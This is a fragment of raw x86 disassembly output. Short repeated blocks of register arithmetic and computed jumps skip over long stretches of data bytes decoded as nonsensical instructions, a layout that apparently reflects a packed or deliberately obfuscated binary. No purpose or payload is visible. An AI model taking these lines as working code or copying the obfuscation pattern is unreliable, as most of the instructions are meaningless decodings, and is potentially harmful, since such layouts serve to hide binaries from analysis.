  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	xchg   BYTE PTR [esi-0x59e3dcf],dl
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b3f4
  40b3be:	ss data16 and bl,0x1b
  40b3c3:	aas    
  40b3c4:	adc    al,0xe9
  40b3c6:	outs   dx,BYTE PTR ds:[si]
  40b3c8:	es jp  0x40b3ba
  40b3cb:	gs cld 
  40b3cd:	popa   
  40b3ce:	in     eax,dx
  40b3cf:	shl    DWORD PTR [edx],0x35
  40b3d2:	sbb    al,BYTE PTR [edi+ebx*2]
  40b3d5:	pop    ebp
  40b3d6:	fimul  WORD PTR [ebx+0x7c]
  40b3d9:	leave  
  40b3da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3db:	idiv   edx
  40b3dd:	repnz (bad) 
  40b3df:	cmp    eax,0x4add4b3f
  40b3e4:	imul   ebp,DWORD PTR [esi],0x55359c6a
  40b3ea:	and    al,BYTE PTR [edx]
  40b3ec:	and    DWORD PTR [eax],ecx
  40b3ee:	retf   
  40b3ef:	or     bh,BYTE PTR [ebx]
  40b3f1:	sub    DWORD PTR [edx],edx
  40b3f3:	jle    0x40b3da
  40b3f5:	es stos DWORD PTR es:[edi],eax
  40b3f7:	scas   eax,DWORD PTR es:[edi]
  40b3f8:	retf   
  40b3f9:	cmc    
  40b3fa:	cmp    esi,edi
  40b3fc:	or     DWORD PTR [ebx+0x28],ebx
  40b3ff:	fiadd  WORD PTR [eax]
  40b401:	aam    0x79
  40b403:	mov    esp,0x12390142
  40b408:	imul   esp,DWORD PTR [ebp+0x51],0xffffff99
  40b40c:	mov    DWORD PTR [ecx+ebp*1+0x6df32dd2],ebx
  40b413:	fsubr  QWORD PTR [edx]
  40b415:	out    dx,eax
  40b416:	mov    dh,0x88
  40b418:	in     eax,dx
  40b419:	sar    eax,0xaf
  40b41c:	or     BYTE PTR [ebx+0x48],bh
  40b41f:	dec    esp
  40b420:	bound  esi,QWORD PTR [eax-0x3a9d7836]
  40b426:	jmp    0x3a11543b
  40b42b:	pop    ebx
  40b42c:	inc    edx
  40b42d:	sbb    bh,BYTE PTR [ebp+0x1d1aff05]
  40b433:	inc    edx
  40b434:	mov    dh,0xc2
  40b436:	hlt    
  40b437:	(bad)  
  40b438:	or     al,0x2e
  40b43a:	test   eax,0x9930548c
  40b43f:	idiv   DWORD PTR [edx+0x75]
  40b442:	dec    edx
  40b443:	and    eax,0x80a7a0aa
  40b448:	or     dh,cl
  40b44a:	fisttp DWORD PTR [ebx-0xb500f3b]
  40b450:	ret    
  40b451:	pushf  
  40b452:	jmp    0x81f79b40
  40b457:	inc    ecx
  40b458:	pop    ecx
  40b459:	add    ch,BYTE PTR [ebx]
  40b45b:	lds    eax,FWORD PTR [eax+0x1eafa2]
  40b461:	and    cl,cl
  40b463:	cmp    dh,BYTE PTR [edx]
  40b465:	and    edx,esp
  40b467:	mov    BYTE PTR [edi+0x55],ch
  40b46a:	mov    esi,0x1d57f1b5
  40b46f:	arpl   WORD PTR [ebp+0x3],dx
  40b472:	add    DWORD PTR [edi],eax
  40b474:	test   BYTE PTR [ebp-0x3c3d532a],al
  40b47a:	es stos DWORD PTR es:[edi],eax
  40b47c:	(bad)  
  40b47d:	push   edx
  40b47e:	jl     0x40b4bc
  40b480:	xor    dl,dl
  40b482:	out    0xdd,al
  40b484:	adc    DWORD PTR [esi+ebx*4-0x2d],0xffffffaf
  40b489:	or     ax,0x41cd
  40b48d:	(bad)  [edi]
  40b48f:	jns    0x40b415
  40b491:	mov    bh,0x42
  40b493:	out    0xa6,al
  40b495:	repnz popa 
  40b497:	pop    ebp
  40b498:	sub    DWORD PTR ds:0xd811d887,eax
  40b49e:	jmp    0xdaaf9a10
  40b4a3:	mov    esi,0xb2b1de39
  40b4a8:	(bad)  [ebp+0x65eab89d]
  40b4ae:	mov    al,ds:0xfa74d2ab
  40b4b3:	lods   al,BYTE PTR ds:[esi]
  40b4b4:	out    dx,al
  40b4b5:	jle    0x40b520
  40b4b7:	ins    DWORD PTR es:[edi],dx
  40b4b8:	shr    BYTE PTR [ecx-0x5f5905e3],cl
  40b4be:	push   ecx
  40b4bf:	js     0x40b446
  40b4c1:	mov    DWORD PTR [ebp-0x7dc42a17],esp
  40b4c7:	into   
  40b4c8:	push   0xcd94d5cc
  40b4cd:	sbb    eax,0xac0898e9
  40b4d2:	and    bl,BYTE PTR [edi+0x393983d9]
  40b4d8:	out    0xb9,al
  40b4da:	mov    esp,0x14eb2e41
  40b4df:	cld    
  40b4e0:	out    0x77,al
  40b4e2:	xchg   edx,eax
  40b4e3:	adc    edi,ebx
  40b4e5:	push   ds
  40b4e6:	mov    ecx,0xfc09efb3
  40b4eb:	mov    al,0xb3
  40b4ed:	ret    0xed1c
  40b4f0:	inc    ebp
  40b4f1:	add    DWORD PTR [ebp-0x2b],ecx
  40b4f4:	les    esp,FWORD PTR [edx+0x2c6ed54b]
  40b4fa:	aas    
  40b4fb:	lods   eax,DWORD PTR ds:[esi]
  40b4fc:	int3   
  40b4fd:	push   ebp
  40b4fe:	and    eax,0xdccb6330
  40b503:	cmp    ch,0xba
  40b506:	pusha  
  40b507:	inc    ecx
  40b508:	test   BYTE PTR [ecx+0x51],al
  40b50b:	jle    0x40b51a
  40b50d:	sbb    bh,BYTE PTR [ebp-0x1fcc707d]
  40b513:	sbb    al,0xf3
  40b515:	ret    
  40b516:	sbb    BYTE PTR [ecx-0x35],0x6
  40b51a:	mov    bl,0xed
  40b51c:	cmp    DWORD PTR [eax],esi
  40b51e:	cmc    
  40b51f:	lock dec ebx
  40b521:	push   esp
  40b522:	jle    0x40b4cd
  40b524:	or     esi,DWORD PTR [edx-0x410dd0ee]
  40b52a:	out    0x1,eax
  40b52c:	stos   DWORD PTR es:[edi],eax
  40b52d:	adc    DWORD PTR [esi],0x25287f69
  40b533:	or     DWORD PTR [ecx+0x4f1e5778],ecx
  40b539:	fadd   QWORD PTR [eax+0x301ff426]
  40b53f:	dec    esi
  40b540:	jb     0x40b531
  40b542:	xchg   ebx,eax
  40b543:	add    BYTE PTR [edi+0x81759f1],0x9
  40b54a:	xchg   ecx,eax
  40b54b:	lds    ebx,FWORD PTR [esi+0x40]
  40b54e:	add    bl,BYTE PTR [esi]
  40b550:	dec    ebp
  40b551:	test   eax,0x74c4a9c8
  40b556:	neg    BYTE PTR [eax+0x48]
  40b559:	test   DWORD PTR [ecx-0x14],ebx
  40b55c:	sar    DWORD PTR [ebx+0x43],0x5b
  40b560:	lea    ebx,ds:0x9d076bd3
  40b566:	arpl   WORD PTR [edx],ax
  40b568:	pop    ebp
  40b569:	jge    0x40b562
  40b56b:	dec    esp
  40b56c:	jmp    0x625a3cdf
  40b571:	in     al,0xb3
  40b573:	sbb    ch,BYTE PTR [eax+0x11]
  40b576:	jno    0x40b53b
  40b578:	dec    esp
  40b579:	xor    ecx,DWORD PTR [esp+ecx*2]
  40b57c:	aaa    
  40b57d:	sbb    al,0x90
  40b57f:	punpckhbw mm5,mm6
  40b582:	lock add al,0x65
  40b585:	ret    
  40b586:	sub    eax,0x3bcd917c
  40b58b:	ds in  al,dx
  40b58d:	ds xor esi,ecx
  40b590:	cdq    
  40b591:	cli    
  40b592:	leave  
  40b593:	xchg   ecx,eax
  40b594:	xor    eax,0x7c0d7584
  40b599:	lock lock in al,0xe4
  40b59d:	cmp    DWORD PTR [edi],eax
  40b59f:	ds shl bh,0xd0
  40b5a3:	es jo  0x40b538
  40b5a6:	fwait
  40b5a7:	push   eax
  40b5a8:	repz adc DWORD PTR [edi+0x37],0x2a
  40b5ad:	shl    dh,0xa3
  40b5b0:	cmc    
  40b5b1:	les    edi,FWORD PTR [edi]
  40b5b3:	xchg   esp,eax
  40b5b4:	sbb    esp,DWORD PTR [ebx-0x5e]
  40b5b7:	test   al,0x7b
  40b5b9:	push   edx
  40b5ba:	ret    0xc3a5
  40b5bd:	loope  0x40b5d2
  40b5bf:	jo     0x40b62f
  40b5c1:	mov    BYTE PTR [edx],0x58
  40b5c4:	clc    
  40b5c5:	push   0xbde634a6
  40b5ca:	xchg   ebp,eax
  40b5cb:	cmc    
  40b5cc:	jns    0x40b5c9
  40b5ce:	cmp    esp,DWORD PTR [edi+eax*2+0x4534825a]
  40b5d5:	scas   eax,DWORD PTR es:[edi]
  40b5d6:	fs push es
  40b5d8:	jns    0x40b62b
  40b5da:	jecxz  0x40b5d3
  40b5dc:	push   esi
  40b5dd:	sub    ch,cl
  40b5df:	pop    ebx
  40b5e0:	xor    al,0xe8
  40b5e2:	cmp    BYTE PTR [esp+edx*2+0xc85e60d],ch
  40b5e9:	pop    edx
  40b5ea:	jle    0x40b5cd
  40b5ec:	ja     0x40b5a3
  40b5ee:	call   0xeb6f7364
  40b5f3:	(bad)  
  40b5f4:	(bad)  
  40b5f5:	xlat   BYTE PTR ds:[ebx]
  40b5f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f7:	mov    ah,0x69
  40b5f9:	push   ds
  40b5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5fb:	loope  0x40b634
  40b5fd:	loop   0x40b585
  40b5ff:	pusha  
  40b600:	ss ret 0xdf0b
  40b604:	fmul   DWORD PTR [esp+ecx*2-0x3]
  40b608:	std    
  40b609:	jae    0x40b651
  40b60b:	push   edx
  40b60c:	mov    BYTE PTR es:[esi-0x1d77a20],bh
  40b613:	jg     0x40b62a
  40b615:	xor    al,0x2
  40b617:	pop    ebx
  40b618:	adc    al,0xc4
  40b61a:	jecxz  0x40b5c4
  40b61c:	ret    
  40b61d:	mov    edx,0x6ed6d597
  40b622:	dec    ebx
  40b623:	push   es
  40b624:	jno    0x40b69a
  40b626:	in     eax,dx
  40b627:	lds    edx,FWORD PTR [ecx]
  40b629:	jl     0x40b5bf
  40b62b:	call   0x4c59fb8e
  40b630:	bound  esi,QWORD PTR [edi]
  40b632:	lea    edi,[eax-0x37dfad74]
  40b638:	outs   dx,DWORD PTR ds:[esi]
  40b639:	jg     0x40b5d4
  40b63b:	xor    eax,DWORD PTR [ecx+0x29ab3438]
  40b641:	inc    ebp
  40b642:	xor    BYTE PTR [edx-0x45742bed],ch
  40b648:	aad    0xd0
  40b64a:	arpl   WORD PTR [edi-0x2a615a95],cx
  40b650:	dec    eax
  40b651:	push   esp
  40b652:	(bad)  
  40b653:	std    
  40b654:	or     DWORD PTR [ecx-0x37104b90],edi
  40b65a:	mov    al,0xb6
  40b65c:	mov    ch,0x60
  40b65e:	and    esp,DWORD PTR [ebp-0xa0c3af7]
  40b664:	retf   0x9656
  40b667:	imul   ebx,DWORD PTR [edx],0xd
  40b66a:	adc    ebp,ebp
  40b66c:	cmp    esp,DWORD PTR ds:0x7e8897c8
  40b672:	imul   esp,DWORD PTR [edi+0xc],0xd07a3fb4
  40b679:	dec    ecx
  40b67a:	aad    0x5b
  40b67c:	xchg   esi,eax
  40b67d:	test   DWORD PTR ds:0xe2778d40,esp
  40b683:	inc    edi
  40b684:	addr16 ss iret 
  40b687:	out    0xc6,eax
  40b689:	dec    BYTE PTR [edx+0x10d4d2b8]
  40b68f:	mov    bh,0x80
  40b691:	retf   0x5ae1
  40b694:	inc    ebx
  40b695:	cmp    al,0x2b
  40b697:	xchg   esi,eax
  40b698:	mov    WORD PTR [edx-0x9],?
  40b69b:	cs mov edx,gs
  40b69e:	adc    al,0x8a
  40b6a0:	add    al,0x5
  40b6a2:	ret    
  40b6a3:	(bad)  
  40b6a4:	push   ss
  40b6a5:	cs dec esi
  40b6a7:	mov    eax,DWORD PTR [ebx+0x41]
  40b6aa:	pop    ecx
  40b6ab:	ds add al,0xfa
  40b6ae:	scas   eax,DWORD PTR es:[edi]
  40b6af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b0:	mov    ah,0x51
  40b6b2:	or     dh,dl
  40b6b4:	jp     0x40b6a2
  40b6b6:	inc    edi
  40b6b7:	and    al,0xe0
  40b6b9:	or     ch,BYTE PTR [ebp+eiz*8-0x52b06d2a]
  40b6c0:	lahf   
  40b6c1:	xchg   edi,eax
  40b6c2:	mul    DWORD PTR [edx-0x36ea8ebe]
  40b6c8:	scas   al,BYTE PTR es:[edi]
  40b6c9:	gs sub esp,esi
  40b6cc:	sbb    al,0xf9
  40b6ce:	outs   dx,DWORD PTR ds:[esi]
  40b6cf:	cmp    al,0xd7
  40b6d1:	dec    ecx
  40b6d2:	cld    
  40b6d3:	xlat   BYTE PTR es:[ebx]
  40b6d5:	mov    cl,0xaa
  40b6d7:	sub    eax,0x2247f0b2
  40b6dc:	adc    DWORD PTR [edi+0x2e],edi
  40b6df:	test   al,0x91
  40b6e1:	ds dec edx
  40b6e3:	xor    BYTE PTR ds:0xc1e1ccbc,dh
  40b6e9:	sar    DWORD PTR [edi-0x4d],cl
  40b6ec:	aad    0xec
  40b6ee:	pop    ss
  40b6ef:	mov    DWORD PTR [ebx+0x44e8df1a],ebp
  40b6f5:	nop
  40b6f6:	mov    ds:0x703f2187,eax
  40b6fb:	xor    DWORD PTR [esi+eax*8],ebp
  40b6fe:	push   edx
  40b6ff:	js     0x40b6bd
  40b701:	pop    ecx
  40b702:	mov    ecx,0xf3c9b52f
  40b707:	popf   
  40b708:	add    al,0xf9
  40b70a:	pop    ss
  40b70b:	inc    edx
  40b70c:	lea    edi,[ecx-0x2d]
  40b70f:	pop    eax
  40b710:	mov    dh,0xe4
  40b712:	nop
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b78b
  40b743:	dec    ecx
  40b744:	fcmove st,st(6)
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b771
  40b74f:	and    al,bl
  40b751:	jge    0x40b75d
  40b753:	outs   dx,BYTE PTR ds:[esi]
  40b754:	cld    
  40b755:	mov    cl,0x1
  40b757:	lods   al,BYTE PTR ds:[esi]
  40b758:	(bad)  
  40b759:	rcl    BYTE PTR [ebp+0x1a],1
  40b75c:	push   eax
  40b75d:	lahf   
  40b75e:	retf   0x178e
  40b761:	mov    ah,0x6d
  40b763:	loopne 0x40b7c3
  40b765:	(bad)  
  40b766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b767:	push   ss
  40b768:	cmp    al,BYTE PTR [ebp-0x3f26237f]
  40b76e:	fnstenv [eax]
  40b770:	mov    bh,0xa7
  40b772:	pop    ebp
  40b773:	pop    esp
  40b774:	ret    
  40b775:	fwait
  40b776:	xchg   edi,eax
  40b777:	cdq    
  40b778:	into   
  40b779:	xchg   ebx,eax
  40b77a:	ins    BYTE PTR es:[edi],dx
  40b77b:	adc    dl,BYTE PTR [ebp-0x4d3c6567]
  40b781:	cmp    BYTE PTR [edx-0x1bfaf5b0],ah
  40b787:	adc    BYTE PTR [eax],bh
  40b789:	js     0x40b7eb
  40b78b:	or     eax,0x34024be4
  40b790:	add    bh,BYTE PTR [eax+0x6ca82e92]
  40b796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b797:	repz aas 
  40b799:	fsub   st(6),st
  40b79b:	xchg   edx,eax
  40b79c:	pusha  
  40b79d:	xor    DWORD PTR [edi+0x159abf12],edx
  40b7a3:	leave  
  40b7a4:	mov    edx,0x472dd517
  40b7a9:	loop   0x40b769
  40b7ab:	mov    eax,ds
  40b7ad:	cmp    al,0xbf
  40b7af:	xor    al,0xe6
  40b7b1:	jg     0x40b822
  40b7b3:	pop    ecx
  40b7b4:	push   edx
  40b7b5:	pop    ds
  40b7b6:	aas    
  40b7b7:	pop    eax
  40b7b8:	add    cl,BYTE PTR [edi+0x5a8b33a5]
  40b7be:	push   esi
  40b7bf:	inc    esi
  40b7c0:	jl     0x40b758
  40b7c2:	in     eax,dx
  40b7c3:	pop    ebx
  40b7c4:	cld    
  40b7c5:	std    
  40b7c6:	in     al,0x48
  40b7c8:	or     dh,bl
  40b7ca:	xor    eax,0xe5470c55
  40b7cf:	imul   ebp,DWORD PTR [edi-0x24a42787],0xffffffe6
  40b7d6:	jge    0x40b7cb
  40b7d8:	ret    0x5f27
  40b7db:	xor    ebp,DWORD PTR [ebp+0x1d]
  40b7de:	cmc    
  40b7df:	pop    ds
  40b7e0:	jns    0x40b845
  40b7e2:	out    0xf6,al
  40b7e4:	(bad)  
  40b7e5:	cli    
  40b7e6:	lock iret 
  40b7e8:	add    al,0x7a
  40b7ea:	jmp    0x79132494
  40b7ef:	cmp    al,0xc0
  40b7f1:	cs in  eax,dx
  40b7f3:	loop   0x40b828
  40b7f5:	add    eax,ebp
  40b7f7:	add    al,0xbb
  40b7f9:	push   cs
  40b7fa:	jp     0x40b843
  40b7fc:	(bad)  
  40b7fd:	rol    BYTE PTR [ebx],cl
  40b7ff:	jb     0x40b80e
  40b801:	imul   BYTE PTR [ebx+0x72]
  40b804:	test   al,0xb8
  40b806:	jae    0x40b884
  40b808:	and    al,BYTE PTR [ecx]
  40b80a:	popa   
  40b80b:	vmovhlps xmm5,xmm7,xmm2
  40b80f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b810:	xchg   BYTE PTR [ecx-0x4c5f49e1],dh
  40b816:	nop
  40b817:	pushf  
  40b818:	int    0x2a
  40b81a:	dec    edi
  40b81b:	daa    
  40b81c:	aaa    
  40b81d:	in     al,dx
  40b81e:	shr    DWORD PTR [esi+0x5e76f42d],0xa7
  40b825:	add    DWORD PTR [edx],eax
  40b827:	pop    edx
  40b828:	jnp    0x40b7f5
  40b82a:	std    
  40b82b:	inc    ecx
  40b82c:	lds    ebx,FWORD PTR [ebx]
  40b82e:	lea    esi,[edx+ebp*1+0x36d8e316]
  40b835:	push   esp
  40b836:	fstp   TBYTE PTR [edx-0x32]
  40b839:	loopne 0x40b7d6
  40b83b:	fwait
  40b83c:	(bad)  
  40b83d:	aam    0xfa
  40b83f:	jmp    0xd52:0xa742cf58
  40b846:	retf   0x47e3
  40b849:	cmp    al,0xed
  40b84b:	data16 mov al,ds:0xc6bfab3
  40b851:	fcmovbe st,st(3)
  40b853:	sbb    DWORD PTR ds:0x67af792d,0xffffffd7
  40b85a:	xor    bh,BYTE PTR ds:0x790c2dab
  40b860:	test   al,0xc7
  40b862:	sub    al,0x1c
  40b864:	test   al,0xff
  40b866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b867:	test   BYTE PTR [ecx+0x11],ah
  40b86a:	les    ebp,FWORD PTR [esi+0x68a608a2]
  40b870:	and    ch,dh
  40b872:	xchg   edi,eax
  40b873:	psubd  mm2,QWORD PTR [esi-0xd]
  40b877:	out    dx,al
  40b878:	xchg   ebx,eax
  40b879:	stos   DWORD PTR es:[edi],eax
  40b87a:	and    eax,0x33be80eb
  40b87f:	push   ebx
  40b880:	repnz mov ebx,0x4f294c8
  40b886:	sbb    DWORD PTR [eax-0x6faba94c],ebp
  40b88c:	push   cs
  40b88d:	enter  0x32bc,0x36
  40b891:	sti    
  40b892:	jp     0x40b8c6
  40b894:	jmp    0x66d0720
  40b899:	cmp    al,0x19
  40b89b:	dec    edi
  40b89c:	ins    DWORD PTR es:[edi],dx
  40b89d:	in     eax,0x70
  40b89f:	je     0x40b830
  40b8a1:	and    ecx,DWORD PTR [ebp-0x2a]
  40b8a4:	and    WORD PTR es:[edx-0x58],cx
  40b8a9:	cmp    al,0x40
  40b8ab:	lds    eax,FWORD PTR [edx-0x4]
  40b8ae:	out    dx,eax
  40b8af:	leave  
  40b8b0:	(bad)  
  40b8b3:	inc    ebp
  40b8b4:	fistp  DWORD PTR [ebx]
  40b8b6:	out    dx,eax
  40b8b7:	add    DWORD PTR [ebx+0x35fbcddd],0x59
  40b8be:	mov    edi,DWORD PTR [ecx+eax*8-0x23]
  40b8c2:	inc    edx
  40b8c3:	push   esi
  40b8c4:	push   0xa68254a4
  40b8c9:	pop    esp
  40b8ca:	(bad)  
  40b8cb:	jmp    0x40b8e7
  40b8cd:	fisubr DWORD PTR [edi+0x655be879]
  40b8d3:	pusha  
  40b8d4:	xchg   ecx,eax
  40b8d5:	loope  0x40b898
  40b8d7:	inc    edx
  40b8d8:	xor    eax,0xb4102f2e
  40b8dd:	mov    al,0x34
  40b8df:	loope  0x40b92d
  40b8e1:	fild   QWORD PTR [edi+0x6fc0421a]
  40b8e7:	rcr    BYTE PTR [eax+0x1d],cl
  40b8ea:	jo     0x40b8a8
  40b8ec:	xchg   esp,eax
  40b8ed:	test   al,0xad
  40b8ef:	(bad)  
  40b8f0:	cmp    bh,BYTE PTR [edx+0x76b52066]
  40b8f6:	and    esp,ebp
  40b8f8:	aam    0x12
  40b8fa:	lds    ebx,FWORD PTR [ecx]
  40b8fc:	fmul   DWORD PTR [eax+esi*1-0x1d66b0c4]
  40b903:	test   DWORD PTR [edi],0xc6397741
  40b909:	mov    bl,BYTE PTR [edx-0x2a3a81c7]
  40b90f:	(bad)  
  40b910:	push   ss
  40b911:	push   ds
  40b912:	mov    ah,0x2a
  40b914:	add    BYTE PTR [ebx+ecx*4+0x3],ch
  40b918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b919:	jb     0x40b8d4
  40b91b:	inc    ecx
  40b91c:	and    ah,ch
  40b91e:	and    eax,0x25fbddbb
  40b923:	jne    0x40b91f
  40b925:	outs   dx,DWORD PTR ds:[esi]
  40b926:	sar    BYTE PTR [esi],cl
  40b928:	pop    edi
  40b929:	loop   0x40b8bf
  40b92b:	pop    edx
  40b92c:	shl    DWORD PTR [ebx],cl
  40b92e:	leave  
  40b92f:	sub    ecx,DWORD PTR [eax-0x69fcabb2]
  40b935:	ret    
  40b936:	retf   0x1a30
  40b939:	popf   
  40b93a:	aaa    
  40b93b:	fstp   DWORD PTR [ebp-0x6]
  40b93e:	icebp  
  40b93f:	fstp   QWORD PTR [ebp-0x46]
  40b942:	and    edx,DWORD PTR [eax]
  40b944:	lahf   
  40b945:	pop    ss
  40b946:	outs   dx,BYTE PTR ds:[esi]
  40b947:	and    eax,0x1a5ca8eb
  40b94c:	and    BYTE PTR [ecx],cl
  40b94e:	(bad)  
  40b94f:	jmp    0x40b984
  40b951:	jmp    0xea017d22
  40b956:	push   es
  40b957:	(bad)  [eax+0x7c]
  40b95a:	inc    edi
  40b95b:	mov    ah,0xfd
  40b95d:	and    eax,DWORD PTR [ebx]
  40b95f:	cli    
  40b960:	mov    esi,0x7e5f3731
  40b965:	and    BYTE PTR [edi],dh
  40b967:	arpl   WORD PTR [ecx-0x19],bp
  40b96a:	push   edx
  40b96b:	mov    ds:0xd3d91689,al
  40b970:	aaa    
  40b971:	sub    ebp,DWORD PTR [eax-0x45]
  40b974:	in     al,dx
  40b975:	into   
  40b976:	xchg   DWORD PTR [esi+0x11a07112],edx
  40b97c:	sbb    bl,BYTE PTR [ecx+edi*4]
  40b97f:	loopne 0x40b964
  40b981:	xchg   ecx,eax
  40b982:	adc    eax,0x69029f34
  40b987:	and    ch,BYTE PTR [ecx+0x6016c6ea]
  40b98d:	xchg   ebx,eax
  40b98e:	data16 aad 0xb4
  40b991:	cdq    
  40b992:	or     DWORD PTR [esi],eax
  40b994:	ds (bad) 
  40b996:	add    DWORD PTR [edi],ebp
  40b998:	sbb    dh,dl
  40b99a:	(bad)  
  40b99b:	aaa    
  40b99c:	xchg   ebp,eax
  40b99d:	mov    ebp,es
  40b99f:	push   0xe9ba089d
  40b9a4:	inc    ebp
  40b9a5:	imul   ebx,DWORD PTR [eax],0x591dfdef
  40b9ab:	cs push 0xefc6de6b
  40b9b1:	xor    al,0x81
  40b9b3:	sub    bl,BYTE PTR [edx+0x47b11bfa]
  40b9b9:	icebp  
  40b9ba:	pop    ecx
  40b9bb:	mov    edx,0x93b30f54
  40b9c0:	and    bl,0x67
  40b9c3:	mov    bl,BYTE PTR [ebx]
  40b9c5:	out    0xbd,al
  40b9c7:	mov    esp,0x8050a13c
  40b9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9cd:	and    BYTE PTR [edx-0x746ee115],al
  40b9d3:	test   al,0x75
  40b9d5:	adc    al,dh
  40b9d7:	dec    ecx
  40b9d8:	imul   ebp,DWORD PTR [ebx-0x72],0xffffffb9
  40b9dc:	dec    ebp
  40b9dd:	mov    eax,ds:0xc33d306f
  40b9e2:	xchg   esi,eax
  40b9e3:	xchg   esi,eax
  40b9e4:	je     0x40ba05
  40b9e6:	cmc    
  40b9e7:	stos   DWORD PTR es:[edi],eax
  40b9e8:	sbb    al,0x96
  40b9ea:	xchg   BYTE PTR [ebx+0x35],dl
  40b9ed:	pop    ss
  40b9ee:	jmp    0x40ba66
  40b9f0:	dec    ecx
  40b9f1:	mov    bl,BYTE PTR [edi-0x32e56cb2]
  40b9f7:	push   ebx
  40b9f8:	pop    ss
  40b9f9:	and    esi,DWORD PTR [edx-0x46cae12d]
  40b9ff:	xor    ebp,DWORD PTR [ebx]
  40ba01:	inc    ecx
  40ba02:	sahf   
  40ba03:	jl     0x40b9eb
  40ba05:	daa    
  40ba06:	scas   eax,DWORD PTR es:[edi]
  40ba07:	int3   
  40ba08:	and    dh,cl
  40ba0a:	enter  0x131,0xb6
  40ba0e:	int    0x6b
  40ba10:	scas   al,BYTE PTR es:[edi]
  40ba11:	adc    al,0x8b
  40ba13:	div    BYTE PTR [edi]
  40ba15:	pop    esp
  40ba16:	pop    eax
  40ba17:	ror    BYTE PTR [eax+ecx*8-0x2733e524],1
  40ba1e:	int    0x41
  40ba20:	lds    esi,FWORD PTR ds:0x5fd0d0f3
  40ba26:	xchg   DWORD PTR [ebx+0x41d6cf97],ecx
  40ba2c:	push   esi
  40ba2d:	(bad)  
  40ba2e:	push   ecx
  40ba2f:	inc    edi
  40ba30:	jnp    0x40b9c6
  40ba32:	or     bl,dh
  40ba34:	int    0x5d
  40ba36:	xor    BYTE PTR [ecx],dh
  40ba38:	xchg   ebx,eax
  40ba39:	fstp   QWORD PTR [edi+0xe]
  40ba3c:	arpl   cx,cx
  40ba3e:	adc    ecx,DWORD PTR [edx]
  40ba40:	and    BYTE PTR [ebp+0x8],bl
  40ba43:	pop    ebx
  40ba44:	mov    ds:0x7d4a11a2,eax
  40ba49:	jnp    0x40baa7
  40ba4b:	mov    edx,0xfbdd10a0
  40ba50:	xchg   ecx,eax
  40ba51:	out    0x46,al
  40ba53:	mov    dh,0xbe
  40ba55:	leave  
  40ba56:	mov    esi,DWORD PTR [edi-0x31]
  40ba59:	leave  
  40ba5a:	lods   eax,DWORD PTR ds:[esi]
  40ba5b:	adc    DWORD PTR [eax+ecx*1],eax
  40ba5e:	aad    0xdc
  40ba60:	mov    dl,BYTE PTR [edx-0x21ae4056]
  40ba66:	mov    WORD PTR [ebp+0x7d56f915],gs
  40ba6c:	(bad)  
  40ba6d:	lods   al,BYTE PTR ds:[esi]
  40ba6e:	jl     0x40ba37
  40ba70:	rcr    BYTE PTR [ecx],1
  40ba72:	and    al,0x3b
  40ba74:	or     eax,DWORD PTR [esi+0x4e88287c]
  40ba7a:	bound  esi,QWORD PTR [eax+edx*4-0x41c6a938]
  40ba81:	pop    es
  40ba82:	cmp    ebx,esp
  40ba84:	cmc    
  40ba85:	cmp    eax,0x63addde
  40ba8a:	pop    ss
  40ba8b:	add    ah,BYTE PTR [ecx]
  40ba8d:	adc    DWORD PTR [esi],edx
  40ba8f:	inc    edi
  40ba90:	in     al,0xd4
  40ba92:	xchg   edx,eax
  40ba93:	jo     0x40bb11
  40ba95:	xchg   ebp,eax
  40ba96:	jb     0x40bac0
  40ba98:	sbb    ecx,DWORD PTR [eax-0x44]
  40ba9b:	nop
  40ba9c:	jmp    0x72b7:0x1767ee09
  40baa3:	xchg   esp,eax
  40baa4:	mov    edx,DWORD PTR [ebp-0x3c]
  40baa7:	mov    edi,DWORD PTR [ebp-0x4]
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
